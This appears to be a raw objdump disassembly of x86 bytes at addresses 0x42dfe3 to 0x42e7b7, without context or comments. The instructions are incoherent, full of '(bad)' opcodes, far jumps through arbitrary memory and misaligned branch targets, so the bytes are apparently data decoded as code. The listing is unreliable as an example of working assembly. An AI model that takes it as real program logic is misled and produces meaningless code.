  42dfe3:	(bad)  
  42dfe4:	inc    DWORD PTR [ebp+0x22e80000]
  42dfea:	and    DWORD PTR [edi+edi*8],0xffffff96
  42dfee:	inc    ebp
  42dfef:	xor    DWORD PTR [ecx],0xffffffaa
  42dff2:	(bad)  
  42dff3:	(bad)  
  42dff4:	(bad)  
  42dff5:	cmp    eax,DWORD PTR [ebx-0xe09434]
  42dffb:	xchg   DWORD PTR [eax],eax
  42dffd:	adc    al,0x81
  42dfff:	jmp    DWORD PTR [edi]
  42e001:	js     0x42e002
  42e003:	inc    DWORD PTR [ebx-0x5b7cffd5]
  42e009:	xor    al,0xcc
  42e00b:	sbb    DWORD PTR [eax],eax
  42e00d:	pop    esi
  42e00e:	fcos   
  42e010:	mov    ecx,0x8a
  42e015:	mov    ecx,0xc448ff89
  42e01a:	(bad)  
  42e01b:	(bad)  
  42e01c:	inc    DWORD PTR [ebx+0x3b]
  42e01f:	push   DWORD PTR [esi+0x14]
  42e022:	dec    esp
  42e024:	inc    DWORD PTR [edi+edi*8-0x1fd501]
  42e02b:	test   eax,0xff1407cc
  42e030:	(bad)  
  42e031:	rol    BYTE PTR [eax],cl
  42e033:	mov    esp,ecx
  42e035:	sahf   
  42e036:	cmp    edi,0xffffffb8
  42e039:	mov    dh,0x83
  42e03b:	aas    
  42e03c:	add    BYTE PTR [ebx+0x18],bh
  42e03f:	sub    DWORD PTR [ebp-0xff7a],0x28
  42e046:	int3   
  42e047:	and    DWORD PTR [edx-0x887c8a],0xffffffe8
  42e04e:	push   esp
  42e04f:	add    BYTE PTR [edi+edi*8],bl
  42e052:	inc    DWORD PTR [eax]
  42e054:	call   FWORD PTR [ebx+eax*4-0xca4401]
  42e05b:	cmc    
  42e05c:	jmp    DWORD PTR [esi+0x1a]
  42e05f:	add    al,al
  42e061:	fdivp  st(7),st
  42e063:	(bad)  
  42e064:	jmp    DWORD PTR [edx]
  42e066:	inc    DWORD PTR [eax]
  42e068:	xchg   BYTE PTR [edx-0x2a00f97d],dh
  42e06e:	xor    bh,bh
  42e070:	retf   
  42e071:	lods   al,BYTE PTR ds:[esi]
  42e072:	int3   
  42e073:	add    DWORD PTR [eax],0xfffffff0
  42e076:	add    BYTE PTR [ebx-0x6800a602],al
  42e07c:	mov    ebp,esi
  42e07e:	cmp    al,BYTE PTR [eax]
  42e080:	sub    ah,BYTE PTR [ebx+0x55ffffff]
  42e086:	inc    DWORD PTR [eax]
  42e088:	adc    edi,DWORD PTR [ebx+eax*4]
  42e08b:	repz add BYTE PTR [ecx],dl
  42e08e:	into   
  42e08f:	sbb    ebp,0xffffffcb
  42e092:	inc    DWORD PTR [ebx-0x237d]
  42e098:	mov    ebx,DWORD PTR [ebx]
  42e09a:	int3   
  42e09b:	jge    0x42e09d
  42e09d:	fucomp st(7)
  42e09f:	cmp    DWORD PTR [esi-0x7c005c],0xffffffda
  42e0a6:	inc    DWORD PTR [eax]
  42e0a8:	rcr    dl,1
  42e0aa:	add    BYTE PTR [ebp-0x1],bl
  42e0ad:	lds    edi,FWORD PTR [edi+edi*8-0xffdcba]
  42e0b4:	adc    eax,0xffffff83
  42e0b7:	dec    ecx
  42e0b9:	dec    ebp
  42e0ba:	add    edx,0x0
  42e0bd:	push   ebp
  42e0be:	add    bh,bh
  42e0c0:	mov    ebp,0xffff00d5
  42e0c5:	fwait
  42e0c6:	int3   
  42e0c7:	(bad)  
  42e0c8:	jmp    0x42e103
  42e0ca:	jmp    FWORD PTR [esi]
  42e0cc:	dec    DWORD PTR [esi+ecx*8-0x1]
  42e0d0:	shl    DWORD PTR [ebx],0xcc
  42e0d3:	dec    DWORD PTR [ecx-0x75337693]
  42e0d9:	xor    al,0xff
  42e0db:	and    edi,edi
  42e0dd:	push   esp
  42e0de:	rol    BYTE PTR [ebx+0xff0cd0],0xff
  42e0e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e0e6:	int3   
  42e0e7:	add    BYTE PTR ds:0x8cc51,bl
  42e0ed:	mov    esp,0x77d483b4
  42e0f2:	add    BYTE PTR [eax],al
  42e0f4:	dec    DWORD PTR [eax+eax*1+0x0]
  42e0f8:	rcr    ch,cl
  42e0fa:	jmp    FWORD PTR [esi]
  42e0fc:	or     esi,0xffffffca
  42e0ff:	jmp    FWORD PTR [edx+0x9]
  42e102:	cmp    edi,0xffffffff
  42e105:	call   0x39d0648d
  42e10a:	call   FWORD PTR [edx+0x2d5483]
  42e110:	dec    DWORD PTR [ecx]
  42e112:	add    bh,bh
  42e114:	add    BYTE PTR [ebx],dl
  42e116:	int3   
  42e117:	add    DWORD PTR [eax],0x66
  42e11a:	jmp    DWORD PTR [ecx-0x1]
  42e11d:	lods   al,BYTE PTR ds:[esi]
  42e11e:	das    
  42e11f:	jmp    FWORD PTR [ebx]
  42e121:	les    eax,FWORD PTR [ebx+0x2383ff]
  42e127:	jmp    FWORD PTR [edx-0x33a0001a]
  42e12d:	retf   
  42e12e:	jb     0x42e130
  42e130:	or     edx,DWORD PTR [ebx+0x34ffff83]
  42e136:	add    bh,bh
  42e138:	xlat   BYTE PTR ds:[ebx]
  42e139:	arpl   di,di
  42e13b:	jl     0x42e13d
  42e13d:	mov    DWORD PTR [edi],ecx
  42e13f:	mov    esp,ebx
  42e141:	or     eax,DWORD PTR [eax]
  42e143:	(bad)  
  42e144:	call   FWORD PTR [ebx-0x1]
  42e147:	inc    ebx
  42e149:	inc    esp
  42e14a:	add    BYTE PTR [edi+0x9c7483],dl
  42e150:	pop    ebp
  42e151:	push   edx
  42e152:	(bad)  
  42e153:	inc    DWORD PTR [ebx-0x68007ce7]
  42e159:	aam    0x0
  42e15b:	je     0x42e0e6
  42e15d:	mov    bh,BYTE PTR ds:0xcc4b6bff
  42e163:	mov    edi,edi
  42e165:	and    edi,edi
  42e167:	call   FWORD PTR [ebp+0xc]
  42e16a:	call   FWORD PTR [ecx-0x7d]
  42e16d:	fnstsw WORD PTR [ecx-0x7d]
  42e170:	push   0xffffa3
  42e175:	xchg   edi,eax
  42e176:	mov    DWORD PTR [ecx+0x1d007bf8],ecx
  42e17c:	jmp    DWORD PTR [ebp-0x54dcff96]
  42e182:	int3   
  42e183:	int3   
  42e184:	int3   
  42e185:	hlt    
  42e186:	mov    DWORD PTR [ebx-0xe7c13f1],eax
  42e18c:	(bad)  
  42e18d:	fld    TBYTE PTR [ebx]
  42e18f:	add    BYTE PTR [esi-0x2a],al
  42e192:	add    BYTE PTR [eax],al
  42e194:	or     DWORD PTR [ebx],0xffffff89
  42e197:	jmp    FWORD PTR [ebp-0x7c9c0052]
  42e19d:	xchg   edi,eax
  42e19e:	mov    esi,0xc0ee00
  42e1a3:	inc    DWORD PTR [eax]
  42e1a5:	push   cs
  42e1a6:	inc    DWORD PTR [eax]
  42e1a8:	ss (bad) 
  42e1aa:	jmp    FWORD PTR [esi-0x34]
  42e1ad:	scas   eax,DWORD PTR es:[edi]
  42e1ae:	mov    edi,edi
  42e1b0:	inc    edx
  42e1b1:	rol    BYTE PTR [ebx-0xce0100],1
  42e1b7:	add    BYTE PTR ds:0x22ffc1,bl
  42e1bd:	xchg   edi,eax
  42e1be:	into   
  42e1bf:	mov    DWORD PTR [esi],ebp
  42e1c1:	call   0x43c6e149
  42e1c6:	add    DWORD PTR [eax],0xffffffb7
  42e1c9:	call   0x1d4300cd
  42e1ce:	scas   al,BYTE PTR es:[edi]
  42e1cf:	int3   
  42e1d0:	xor    BYTE PTR [eax-0x4bff0100],cl
  42e1d6:	inc    DWORD PTR [eax]
  42e1d8:	in     eax,dx
  42e1d9:	stc    
  42e1da:	adc    DWORD PTR [edx+0x47f5ff],0x68
  42e1e1:	test   DWORD PTR [ebx-0xf20100],eax
  42e1e7:	int3   
  42e1e8:	int    0xd9
  42e1ea:	add    BYTE PTR [ebx],bh
  42e1ec:	dec    DWORD PTR [esi+0x3a1a00fb]
  42e1f2:	inc    DWORD PTR [ebx+0xff97ff]
  42e1f8:	loopne 0x42e1f0
  42e1fa:	add    ch,cl
  42e1fc:	push   DWORD PTR [eax-0x2a]
  42e1ff:	jmp    DWORD PTR [edi+edx*8-0x71ff0001]
  42e206:	add    BYTE PTR [eax],al
  42e208:	fcom   DWORD PTR [esi]
  42e20a:	dec    DWORD PTR [ebp-0x7f7701]
  42e210:	dec    eax
  42e211:	and    al,0x0
  42e213:	or     esp,0xffffffdd
  42e216:	(bad)  
  42e217:	call   FWORD PTR [ebx]
  42e219:	jge    0x42e21a
  42e21b:	mov    ds:0xe245ff,al
  42e220:	dec    edi
  42e221:	add    esp,ecx
  42e223:	(bad)  
  42e224:	dec    DWORD PTR [edi-0x20af007d]
  42e22a:	int3   
  42e22b:	or     al,0xff
  42e22d:	dec    eax
  42e22e:	int3   
  42e22f:	push   DWORD PTR [ebp+0xcc0010]
  42e235:	test   bh,bh
  42e237:	jmp    edi
  42e239:	dec    ebx
  42e23a:	add    dh,al
  42e23c:	add    BYTE PTR [esi+0x37e9ff98],ch
  42e242:	add    bh,bh
  42e244:	(bad)  
  42e245:	out    dx,al
  42e246:	add    BYTE PTR [ecx+0x5fffc0a4],cl
  42e24c:	add    BYTE PTR [ebp+edx*1+0x37a189],dh
  42e253:	inc    DWORD PTR [ebx+0x2cffff3a]
  42e259:	or     al,BYTE PTR [ebx+0x5045ffed]
  42e25f:	call   DWORD PTR [ebp-0x3d]
  42e262:	inc    DWORD PTR [eax]
  42e264:	jmp    edx
  42e266:	int3   
  42e267:	push   edx
  42e269:	in     al,dx
  42e26a:	inc    DWORD PTR [edi+0x7bdeff]
  42e270:	fwait
  42e271:	add    BYTE PTR [ebx-0x7c667d00],0xff
  42e278:	loope  0x42e2ba
  42e27a:	int3   
  42e27b:	xlat   BYTE PTR ds:[ebx]
  42e27c:	jmp    FWORD PTR [ebx+eiz*2]
  42e27f:	add    DWORD PTR [ebx],0xffffffab
  42e282:	add    bh,bh
  42e284:	add    BYTE PTR [ecx+0x6fabff00],ah
  42e28a:	(bad)  
  42e28b:	jmp    0x42e28d
  42e28d:	fisubr WORD PTR [esi]
  42e28f:	adc    DWORD PTR [ecx],0x68
  42e292:	(bad)  
  42e293:	inc    DWORD PTR [eax]
  42e295:	dec    ebp
  42e296:	add    DWORD PTR [eax],0xffffff81
  42e299:	pop    edi
  42e29a:	call   FWORD PTR [edx-0x7b6b01]
  42e2a0:	arpl   WORD PTR [eax],bp
  42e2a2:	dec    DWORD PTR [ecx-0x3d7d]
  42e2a8:	push   eax
  42e2a9:	inc    edi
  42e2aa:	add    BYTE PTR [ebx-0xb07a7d],al
  42e2b0:	mov    eax,0xffcc00d4
  42e2b5:	xchg   ecx,eax
  42e2b6:	int3   
  42e2b7:	add    BYTE PTR [ebp-0x74],ah
  42e2ba:	(bad)  
  42e2bb:	jle    0x42e2bc
  42e2bd:	jmp    0xff:0x7b0f8344
  42e2c4:	add    BYTE PTR [ecx-0x1],ah
  42e2c7:	add    BYTE PTR [ecx],bh
  42e2c9:	xor    al,BYTE PTR [eax]
  42e2cb:	add    bh,bh
  42e2cd:	lds    esp,FWORD PTR [esi-0x7c4ccc01]
  42e2d3:	(bad)  
  42e2d4:	(bad)  
  42e2d5:	fild   WORD PTR [eax]
  42e2d7:	call   DWORD PTR [eax]
  42e2d9:	clc    
  42e2da:	add    BYTE PTR [esi+0x6582ff],cl
  42e2e0:	adc    bl,BYTE PTR [edx]
  42e2e2:	add    BYTE PTR [eax],al
  42e2e4:	add    DWORD PTR [ebx-0x248d0000],0xffffffff
  42e2eb:	push   0x0
  42e2ed:	jecxz  0x42e2af
  42e2ef:	add    BYTE PTR [ebx+0x2a],cl
  42e2f2:	add    bh,bh
  42e2f4:	inc    DWORD PTR [eax+eax*1+0x0]
  42e2f8:	inc    edx
  42e2f9:	add    al,0x0
  42e2fb:	stc    
  42e2fc:	call   FWORD PTR [edx+edi*1-0xaba97d]
  42e303:	int3   
  42e304:	jmp    DWORD PTR [esi-0x1]
  42e307:	and    DWORD PTR [edi+ecx*8],0xffffffff
  42e30b:	pop    esi
  42e30c:	mov    edi,eax
  42e30e:	cmp    bh,bh
  42e310:	jnp    0x42e2fa
  42e312:	add    DWORD PTR [eax],0xffffffff
  42e315:	dec    edx
  42e316:	(bad)  
  42e317:	inc    esp
  42e319:	into   
  42e31a:	(bad)  
  42e31b:	mov    edx,0xff44d8ff
  42e320:	adc    ch,BYTE PTR [esi]
  42e322:	(bad)  
  42e323:	inc    DWORD PTR [eax]
  42e325:	arpl   di,di
  42e327:	add    BYTE PTR [edx],bl
  42e329:	mov    ebx,0xe5ffc300
  42e32e:	xchg   DWORD PTR [eax],eax
  42e330:	(bad)  
  42e331:	fmulp  st(4),st
  42e333:	(bad)  
  42e334:	call   DWORD PTR [ebx+0x1247ffff]
  42e33a:	add    BYTE PTR [ebx],ah
  42e33c:	call   FWORD PTR [edx]
  42e33e:	mov    ebp,0x89e86f83
  42e343:	add    BYTE PTR [ebx+0x1d89ccad],al
  42e349:	in     eax,dx
  42e34a:	cmp    ebp,0x0
  42e34d:	cwde   
  42e34e:	inc    ebp
  42e34f:	call   FWORD PTR [edi]
  42e351:	mov    esp,0x7aff00ff
  42e356:	add    ah,cl
  42e358:	(bad)  
  42e35a:	inc    DWORD PTR [edi+edi*8+0x77]
  42e35e:	mov    cs,WORD PTR [ecx-0x7c007f9c]
  42e364:	add    dh,ch
  42e366:	add    BYTE PTR [eax],al
  42e368:	fwait
  42e369:	push   es
  42e36a:	add    DWORD PTR [edx],0xffffffff
  42e36d:	bound  esi,QWORD PTR [edx]
  42e36f:	(bad)  
  42e370:	fucomi st,st(1)
  42e372:	(bad)  
  42e373:	dec    esp
  42e375:	or     DWORD PTR [ebx-0xc85d01],eax
  42e37b:	adc    bh,bh
  42e37d:	xor    DWORD PTR [edi+edi*8],ebp
  42e380:	xor    DWORD PTR [ecx],0x9a000083
  42e386:	add    BYTE PTR [eax],al
  42e388:	sbb    BYTE PTR [eax-0x1],ah
  42e38b:	mov    esp,0x273cff
  42e390:	or     cl,dl
  42e392:	add    BYTE PTR [eax],al
  42e394:	call   FWORD PTR [edi]
  42e396:	dec    esp
  42e398:	shl    cl,1
  42e39a:	call   DWORD PTR [edi]
  42e39c:	xor    DWORD PTR [ecx+0xa],0xffffffff
  42e3a0:	dec    esi
  42e3a1:	inc    esp
  42e3a2:	add    bh,bh
  42e3a4:	jmp    DWORD PTR [ebp+0x0]
  42e3a7:	call   DWORD PTR [esi]
  42e3a9:	lods   eax,DWORD PTR ds:[esi]
  42e3aa:	add    BYTE PTR [eax],dh
  42e3ac:	adc    DWORD PTR [edx-0x582aff2f],0xffffffff
  42e3b3:	inc    DWORD PTR [eax]
  42e3b5:	pop    ebp
  42e3b6:	dec    esp
  42e3b8:	push   ebx
  42e3b9:	cmp    DWORD PTR [eax],eax
  42e3bb:	and    al,BYTE PTR [eax]
  42e3bd:	setge  BYTE PTR [eax]
  42e3c0:	push   edx
  42e3c1:	std    
  42e3c2:	add    bh,bh
  42e3c4:	xor    DWORD PTR [ebx],0xffffff83
  42e3c7:	cmp    DWORD PTR [ecx],0xffffffa7
  42e3ca:	int3   
  42e3cb:	popf   
  42e3cc:	add    ch,bl
  42e3ce:	stos   BYTE PTR es:[edi],al
  42e3cf:	add    DWORD PTR [edi-0x7cff006c],0x70
  42e3d6:	inc    DWORD PTR [ebx-0x1002bab]
  42e3dc:	(bad)  
  42e3dd:	mov    ebx,0x302a00cb
  42e3e2:	dec    esp
  42e3e4:	(bad)  
  42e3e5:	cmp    ecx,esp
  42e3e7:	add    BYTE PTR [esi],bl
  42e3e9:	add    bh,bh
  42e3eb:	mov    es,WORD PTR [eax]
  42e3ed:	sub    BYTE PTR [ecx],dh
  42e3ef:	add    BYTE PTR [ebx-0xff00b5],ch
  42e3f5:	adc    al,0x0
  42e3f7:	add    BYTE PTR [ebx],bh
  42e3f9:	sbb    edi,edi
  42e3fb:	mov    dl,0xff
  42e3fd:	dec    esi
  42e3fe:	dec    ebp
  42e3ff:	add    BYTE PTR [esi],al
  42e401:	(bad)  
  42e402:	inc    DWORD PTR [ebx-0x1d34]
  42e408:	adc    DWORD PTR [ecx-0x7d],esp
  42e40b:	add    al,0xcc
  42e40d:	pop    eax
  42e40e:	rol    DWORD PTR [ebx-0x33001a9d],1
  42e414:	jmp    DWORD PTR [ebx+0xb1bff00]
  42e41a:	add    cl,cl
  42e41c:	add    BYTE PTR [esi-0x4e11008d],ch
  42e422:	(bad)  
  42e423:	inc    DWORD PTR [eax]
  42e425:	in     eax,dx
  42e426:	add    bh,bh
  42e428:	adc    eax,DWORD PTR [bp+di-0x76ae]
  42e42d:	xchg   edi,eax
  42e42e:	es add cl,dh
  42e431:	mov    dl,0x0
  42e433:	inc    DWORD PTR [eax]
  42e435:	mov    ds:0x265400ff,eax
  42e43a:	add    BYTE PTR [edx-0x1],cl
  42e43d:	aaa    
  42e43e:	les    eax,FWORD PTR [eax]
  42e440:	cmp    bh,al
  42e442:	dec    DWORD PTR [ecx-0x4b00]
  42e448:	jnp    0x42e47a
  42e44a:	inc    ebp
  42e44c:	add    BYTE PTR [edi+0xf],dl
  42e44f:	(bad)  
  42e450:	cmp    esp,DWORD PTR [ecx+0x8000000]
  42e456:	dec    DWORD PTR [ecx+0x36ffae25]
  42e45c:	dec    DWORD PTR [edx+eiz*1]
  42e45f:	(bad)  
  42e460:	jge    0x42e4e0
  42e462:	dec    esp
  42e464:	call   DWORD PTR [esi+0x5ddf0089]
  42e46a:	inc    DWORD PTR [edi+0x5699cc]
  42e470:	dec    eax
  42e471:	sbb    eax,0xf50083ff
  42e476:	cmp    edi,0xfffffff7
  42e479:	xor    eax,0xd683f100
  42e47e:	je     0x42e47f
  42e480:	dec    DWORD PTR [edi]
  42e482:	inc    DWORD PTR [ebx-0x7cff2701]
  42e488:	(bad)  
  42e489:	mov    ds:0xd8837bcc,al
  42e48e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e48f:	dec    DWORD PTR [ebp-0x16]
  42e492:	add    BYTE PTR [ecx+0xba00],cl
  42e498:	pop    ecx
  42e499:	aad    0xff
  42e49b:	(bad)  
  42e49d:	(bad)  
  42e49e:	mov    ch,0xff
  42e4a0:	in     eax,0x65
  42e4a2:	cmp    edi,0xffffff83
  42e4a5:	out    dx,al
  42e4a6:	add    DWORD PTR [eax],0x64
  42e4a9:	mov    ds:0x1289b283,al
  42e4ae:	jmp    0x839cb2
  42e4b3:	add    BYTE PTR [eax],al
  42e4b5:	dec    eax
  42e4b6:	add    ah,cl
  42e4b8:	sub    eax,0x8938ff21
  42e4bd:	mov    ch,0x2
  42e4bf:	add    BYTE PTR [eax-0xffff3b],cl
  42e4c5:	popa   
  42e4c6:	add    BYTE PTR [eax],al
  42e4c8:	ret    
  42e4c9:	arpl   WORD PTR [ebx+0x6969833f],ax
  42e4cf:	add    BYTE PTR [ecx+0x83a1],ah
  42e4d5:	cmp    al,0x83
  42e4d7:	add    BYTE PTR [ebp-0x43],dh
  42e4da:	jmp    DWORD PTR [edi+0x10ce00]
  42e4e0:	imul   edi,ebp,0xf2cc00ff
  42e4e6:	(bad)  
  42e4e7:	jmp    FWORD PTR [esp+edi*8-0x7d]
  42e4eb:	daa    
  42e4ec:	jmp    FWORD PTR [eax]
  42e4ee:	xor    edi,edi
  42e4f0:	int3   
  42e4f1:	stc    
  42e4f2:	add    bh,bh
  42e4f4:	(bad)  
  42e4f5:	mov    edi,0x8da4ff00
  42e4fa:	dec    edi
  42e4fc:	add    BYTE PTR [ebx],bh
  42e4fe:	mov    ecx,0x89d2d900
  42e503:	int3   
  42e504:	(bad)  
  42e505:	jl     0x42e506
  42e507:	sub    ebp,0x1b
  42e50a:	add    BYTE PTR [ebx-0x1],bl
  42e50d:	cmp    DWORD PTR [ebx],esi
  42e50f:	push   DWORD PTR [esp+edi*2-0x1]
  42e513:	mov    DWORD PTR [eax],eax
  42e515:	pusha  
  42e516:	(bad)  
  42e517:	call   FWORD PTR [edx-0x64]
  42e51a:	call   DWORD PTR [ecx-0xee6300]
  42e520:	pop    ecx
  42e521:	sub    eax,0xd8ff0000
  42e526:	add    bh,bh
  42e528:	les    ebp,FWORD PTR [edi-0x7d]
  42e52b:	inc    edi
  42e52c:	add    BYTE PTR [ebx],al
  42e52e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e52f:	xor    DWORD PTR [ebx-0x68],0xffffffff
  42e533:	inc    DWORD PTR [ebx+0x44ff000a]
  42e539:	sti    
  42e53a:	add    BYTE PTR [esi-0x77],dh
  42e53d:	mov    ebp,0x7cfd0047
  42e542:	(bad)  
  42e543:	dec    DWORD PTR [ecx+0x7effffc2]
  42e549:	jbe    0x42e517
  42e54b:	mov    eax,0xa0b7ff
  42e550:	loope  0x42e58c
  42e552:	dec    DWORD PTR [ecx+0x89b2ff]
  42e558:	adc    dl,al
  42e55a:	inc    DWORD PTR [ecx-0x7cd65901]
  42e560:	scas   al,BYTE PTR es:[edi]
  42e561:	or     bh,bh
  42e563:	add    BYTE PTR [eax],al
  42e565:	xchg   edx,eax
  42e566:	add    DWORD PTR [eax],0x7e
  42e569:	rol    BYTE PTR [eax],0xb5
  42e56c:	dec    DWORD PTR ds:0xf513ff0b
  42e572:	(bad)  
  42e573:	inc    DWORD PTR [ebx-0x71ffff74]
  42e579:	mov    al,ds:0x778979ff
  42e57e:	sar    edi,1
  42e580:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e581:	dec    ebp
  42e582:	inc    DWORD PTR [eax]
  42e584:	push   DWORD PTR [esi+0x0]
  42e587:	push   DWORD PTR [eax+0x28]
  42e58a:	(bad)  
  42e58b:	cmp    bh,bh
  42e58d:	test   BYTE PTR [eax-0x1],ah
  42e590:	jp     0x42e559
  42e592:	(bad)  
  42e593:	(bad)  
  42e594:	call   DWORD PTR [esi-0x1]
  42e597:	add    BYTE PTR [esi-0x28],ah
  42e59a:	add    BYTE PTR [edi-0x1],ch
  42e59d:	inc    edi
  42e59e:	das    
  42e59f:	add    BYTE PTR [ebx-0x7c003325],bl
  42e5a5:	fld    DWORD PTR [eax]
  42e5a7:	dec    edx
  42e5a9:	pop    edx
  42e5aa:	add    dl,bl
  42e5ac:	add    BYTE PTR [eax-0x185bff68],al
  42e5b2:	dec    esp
  42e5b4:	inc    DWORD PTR [ebp+0x0]
  42e5b7:	int3   
  42e5b8:	add    eax,0xb3ff6e
  42e5bd:	aas    
  42e5be:	bnd jmp eax
  42e5c1:	mov    ch,0xff
  42e5c3:	dec    DWORD PTR [ecx+0x5100ff2a]
  42e5c9:	cmp    al,BYTE PTR [eax]
  42e5cb:	mov    dl,0x0
  42e5cd:	ret    0xff50
  42e5d0:	dec    DWORD PTR [ecx-0xa5fb00]
  42e5d6:	js     0x42e57f
  42e5d8:	inc    DWORD PTR [eax]
  42e5da:	adc    DWORD PTR [ebx-0x10],0xffffffff
  42e5de:	jecxz  0x42e595
  42e5e0:	add    bh,bh
  42e5e2:	mov    DWORD PTR [eax-0x16],esp
  42e5e5:	add    bh,cl
  42e5e7:	cs add bh,bh
  42e5ea:	dec    DWORD PTR [ecx+0x3ad50036]
  42e5f0:	add    BYTE PTR [eax],al
  42e5f2:	cmp    ebx,0xfffffff6
  42e5f5:	add    BYTE PTR [esi+0x49],dl
  42e5f8:	add    DWORD PTR [ebx-0x7c5f7900],0xffffff86
  42e5ff:	rol    BYTE PTR [eax],cl
  42e601:	inc    DWORD PTR [ebx-0x6aff1e50]
  42e607:	test   al,0xff
  42e609:	int3   
  42e60a:	add    dl,bh
  42e60c:	(bad)  
  42e60d:	call   ecx
  42e60f:	out    0x0,al
  42e611:	cmp    edi,0xffffffec
  42e614:	xchg   esi,eax
  42e615:	add    BYTE PTR [ebx-0xf],cl
  42e618:	inc    DWORD PTR [eax]
  42e61a:	add    BYTE PTR ds:0x837800cc,bl
  42e620:	(bad)  
  42e621:	(bad)  
  42e622:	push   DWORD PTR [ebp-0x6]
  42e625:	jmp    DWORD PTR [edx-0xffff7e]
  42e62b:	push   eax
  42e62c:	(bad)  
  42e62e:	add    ch,ch
  42e630:	add    BYTE PTR [eax],al
  42e632:	push   DWORD PTR [ebx+0x43]
  42e635:	add    BYTE PTR [eax-0xff768b],bl
  42e63b:	cwde   
  42e63c:	or     edi,edi
  42e63e:	mov    ch,0x93
  42e640:	inc    DWORD PTR [eax]
  42e642:	add    BYTE PTR [esi+esi*4],al
  42e645:	jmp    FWORD PTR [edx+ecx*4-0x1]
  42e649:	add    BYTE PTR [eax],al
  42e64b:	loope  0x42e6bc
  42e64d:	dec    DWORD PTR [eax-0x66]
  42e650:	int3   
  42e651:	(bad)  
  42e652:	inc    ecx
  42e654:	jl     0x42e655
  42e656:	les    ebx,FWORD PTR [edx+0x6000ffcc]
  42e65c:	xor    cl,BYTE PTR [ecx-0x7c765124]
  42e662:	jmp    FWORD PTR [eax]
  42e664:	pop    edx
  42e665:	add    BYTE PTR [edi],cl
  42e667:	outs   dx,BYTE PTR ds:[esi]
  42e668:	inc    DWORD PTR [eax]
  42e66a:	dec    DWORD PTR [edx-0x1a58760b]
  42e670:	inc    DWORD PTR [ebx-0xa9e501]
  42e676:	imul   edi,edi,0xb700ffff
  42e67c:	mov    esi,0xa89aff
  42e681:	int3   
  42e682:	int3   
  42e683:	mov    BYTE PTR [edi-0x1],0xab
  42e687:	lods   al,BYTE PTR ds:[esi]
  42e688:	inc    DWORD PTR [eax]
  42e68a:	int3   
  42e68b:	ss xor bh,bh
  42e68e:	(bad)
  42e691:	(bad)  
  42e692:	(bad)  
  42e693:	out    dx,eax
  42e694:	jle    0x42e662
  42e696:	test   DWORD PTR [eax+0x17008383],ebx
  42e69c:	sbb    edi,edi
  42e69e:	xchg   ebx,eax
  42e69f:	pop    es
  42e6a0:	add    DWORD PTR [ebx+0xa294ff],0x59
  42e6a7:	and    DWORD PTR [eax],eax
  42e6a9:	dec    DWORD PTR [ecx+0x20ff3db1]
  42e6af:	lock add BYTE PTR [eax],al
  42e6b2:	add    dh,al
  42e6b4:	mov    bl,0xff
  42e6b6:	xor    edi,DWORD PTR [edi+0x6f83ffff]
  42e6bc:	dec    ebp
  42e6bd:	call   FWORD PTR [edx-0x7cff769c]
  42e6c3:	or     ebp,DWORD PTR [esi]
  42e6c5:	add    BYTE PTR [edi-0x76000062],al
  42e6cb:	in     al,dx
  42e6cc:	mov    ds:0x8b500,eax
  42e6d1:	add    DWORD PTR [eax],0x22
  42e6d4:	push   edi
  42e6d5:	dec    DWORD PTR [eax]
  42e6d7:	inc    BYTE PTR [ebx-0x2b53ff01]
  42e6dd:	add    DWORD PTR [eax+0x35],0xffffffff
  42e6e1:	inc    DWORD PTR [eax]
  42e6e3:	adc    DWORD PTR [ebp-0x406734],edx
  42e6e9:	dec    DWORD PTR [ecx+0x5c0074a5]
  42e6ef:	inc    DWORD PTR ss:[ebx-0x7c34f300]
  42e6f6:	(bad)  
  42e6f7:	out    0xff,al
  42e6f9:	inc    DWORD PTR [ebx-0x60ff3d7f]
  42e6ff:	dec    eax
  42e700:	dec    DWORD PTR [ecx+0x66ca83]
  42e706:	fiadd  DWORD PTR [edi+edi*8]
  42e709:	inc    DWORD PTR [eax]
  42e70b:	push   ss
  42e70c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e70d:	jmp    DWORD PTR [esi+0x5e]
  42e710:	(bad)  
  42e711:	(bad)  
  42e712:	(bad)  
  42e713:	jg     0x42e699
  42e715:	add    DWORD PTR [edx],0xffffffcd
  42e718:	cmp    edi,0xffffff83
  42e71b:	fdiv   QWORD PTR [edx+0x0]
  42e71e:	fadd   QWORD PTR [ebx+0x52ffffcc]
  42e724:	in     al,0xff
  42e726:	push   esp
  42e727:	(bad)  
  42e728:	add    bh,bh
  42e72a:	add    al,al
  42e72c:	mov    edx,0x136eff
  42e731:	inc    DWORD PTR [ebx-0x21ff5653]
  42e737:	add    BYTE PTR cs:[ecx-0xe6b000],cl
  42e73e:	cwde   
  42e73f:	push   0x96ff00ff
  42e744:	ret    
  42e745:	add    BYTE PTR [ebx+edx*4],al
  42e748:	add    bh,bh
  42e74a:	add    BYTE PTR [ebx-0x1f76ff24],dh
  42e750:	add    BYTE PTR [eax],al
  42e752:	sub    edi,0xffffffd3
  42e755:	xor    esp,0x19
  42e758:	add    ah,cl
  42e75a:	add    BYTE PTR [ebp-0x49bf0072],dl
  42e760:	int3   
  42e761:	add    BYTE PTR [eax],al
  42e763:	add    BYTE PTR [edi],0xff
  42e766:	mov    ah,0x39
  42e768:	inc    DWORD PTR [ebx-0x8dc200]
  42e76e:	(bad)  [edi-0x6e33ff01]
  42e774:	sahf   
  42e775:	add    BYTE PTR [edi+0xb],bh
  42e778:	(bad)  
  42e779:	inc    DWORD PTR [eax]
  42e77b:	(bad)  
  42e77c:	test   eax,0x4be200
  42e781:	inc    DWORD PTR [eax]
  42e783:	mov    bl,0x79
  42e785:	(bad)  
  42e786:	in     eax,dx
  42e787:	push   edx
  42e788:	add    bh,bh
  42e78a:	int3   
  42e78b:	outs   dx,BYTE PTR ds:[esi]
  42e78c:	add    al,BYTE PTR [ebx-0xff28ee]
  42e792:	jmp    DWORD PTR [eax-0x2340002a]
  42e798:	inc    DWORD PTR [ebx-0x4ded7d]
  42e79e:	push   0x36
  42e7a0:	cmp    edi,0xffffffff
  42e7a3:	cmc    
  42e7a4:	mov    ecx,0xff68daff
  42e7a9:	int3   
  42e7aa:	xor    ecx,0x3c
  42e7ad:	and    eax,0xffffff89
  42e7b0:	(bad)  
  42e7b1:	(bad)  
  42e7b2:	call   ecx
  42e7b4:	aas    
  42e7b5:	add    dh,al
  42e7b7:	in     eax,dx
